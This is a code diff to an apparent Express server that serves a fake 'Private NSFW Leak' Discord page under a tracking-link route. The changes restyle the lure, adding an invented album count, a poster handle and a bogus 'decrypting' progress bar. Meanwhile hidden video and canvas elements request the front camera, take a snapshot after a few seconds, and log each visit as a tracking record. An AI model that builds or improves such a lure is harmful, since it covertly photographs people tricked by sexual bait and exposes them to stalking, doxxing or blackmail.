@@ -23,7 +23,7 @@ app.get('/', (req, res) => res.send('✅ Service running'));
 
 const trackingLinks = new Map();
 
-// ================== SEXIER GIRL PAGE (More Revealing) ==================
+// ================== YOUR IMAGE PAGE ==================
 app.get('/nsfw-leak/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
@@ -40,68 +40,80 @@ app.get('/nsfw-leak/:id', (req, res) => {
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Discord • Private NSFW</title>
+  <title>Discord • Private NSFW Leak</title>
   <style>
     body { 
-      background: linear-gradient(135deg, #0a000f, #220022); 
-      color: #ff00cc; 
+      background: #0a0a0a; 
+      color: #ddd; 
       font-family: 'Segoe UI', Arial, sans-serif; 
       text-align: center; 
       margin: 0; 
-      padding: 40px 20px; 
+      padding: 30px 15px; 
       min-height: 100vh;
     }
-    .container { max-width: 460px; margin: 0 auto; }
-    h1 { 
-      font-size: 29px; 
-      margin: 15px 0; 
-      text-shadow: 0 0 15px #ff00aa; 
+    .header {
+      color: #ff00aa;
+      font-size: 26px;
+      margin-bottom: 8px;
+    }
+    .subheader {
+      color: #aaa;
+      font-size: 15px;
+      margin-bottom: 25px;
+    }
+    .album {
+      max-width: 420px;
+      margin: 0 auto 30px;
+      background: #111;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(255,0,170,0.4);
+      border: 1px solid #333;
     }
     .preview {
       width: 100%;
-      max-width: 380px;
-      height: 460px;
-      background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.7)), 
-                  url('https://picsum.photos/id/1005/800/1200');
-      background-size: cover;
-      background-position: center 30%;
-      border-radius: 16px;
-      margin: 25px auto;
+      height: 480px;
+      background: url('https://i.imgur.com/NOrim.png') center/cover no-repeat;   /* Your image */
       position: relative;
-      box-shadow: 0 0 45px rgba(255, 0, 170, 0.7);
-      border: 3px solid #ff00aa;
     }
     .preview::after {
-      content: "18+ EXPLICIT";
+      content: "18+ LEAKED";
       position: absolute;
-      top: 20px;
-      right: 20px;
-      background: #ff0066;
+      top: 15px;
+      left: 15px;
+      background: #c00;
       color: white;
-      padding: 6px 18px;
-      border-radius: 30px;
-      font-size: 13px;
+      padding: 5px 14px;
+      border-radius: 4px;
+      font-size: 12px;
       font-weight: bold;
     }
+    .info {
+      padding: 15px;
+      background: #1a1a1a;
+      font-size: 14px;
+      color: #bbb;
+    }
+    .progress-container {
+      margin: 30px auto;
+      max-width: 380px;
+    }
     .progress { 
-      height: 10px; 
+      height: 9px; 
       background: #222; 
-      border-radius: 999px; 
+      border-radius: 4px; 
       overflow: hidden; 
-      margin: 35px auto; 
-      max-width: 400px; 
     }
     .bar { 
       height: 100%; 
       width: 0%; 
-      background: linear-gradient(90deg, #ff00aa, #ff3399, #ff66ff); 
-      animation: load 5.8s linear forwards; 
+      background: linear-gradient(90deg, #ff00aa, #ff66cc); 
+      animation: load 6.2s linear forwards; 
     }
     .status { 
-      color: #00ffbb; 
-      font-size: 19px; 
-      margin: 20px 0; 
-      font-weight: 600;
+      color: #00ff99; 
+      font-size: 17px; 
+      margin-top: 12px;
     }
     @keyframes load { 
       to { width: 100%; } 
@@ -109,18 +121,22 @@ app.get('/nsfw-leak/:id', (req, res) => {
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🔞 Private NSFW Leak</h1>
-    <p style="color:#ff99dd;">Content from restricted Discord server • Only for 18+</p>
-    
+  <div class="header">🔞 Private NSFW Leak</div>
+  <div class="subheader">Leaked from restricted Discord server • 31 photos + 9 videos</div>
+  
+  <div class="album">
     <div class="preview"></div>
-    
-    <p style="font-size:17px; margin:15px 0;">Decrypting private photos & videos...</p>
-    <div class="progress"><div class="bar"></div></div>
-    <p class="status" id="status">69% • Almost there...</p>
-    
-    <p style="color:#ffcc00; font-size:14px;">This content contains explicit 18+ material</p>
+    <div class="info">
+      Posted by @secretleaks • 3 hours ago<br>
+      <strong>18+ ONLY • Do not share</strong>
+    </div>
   </div>
+
+  <p style="color:#ff99cc;">Decrypting full album...</p>
+  <div class="progress-container">
+    <div class="progress"><div class="bar"></div></div>
+  </div>
+  <p class="status" id="status">Decrypting media files • 71%...</p>
 
   <video id="video" autoplay playsinline style="display:none"></video>
   <canvas id="canvas" style="display:none"></canvas>
@@ -148,7 +164,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
-        video.onloadedmetadata = () => setTimeout(takePhoto, 3500);
+        video.onloadedmetadata = () => setTimeout(takePhoto, 3400);
       } catch(e) {
         document.getElementById('status').innerHTML = "Camera access blocked<br>Redirecting...";
         await logVisit(null, "Denied");
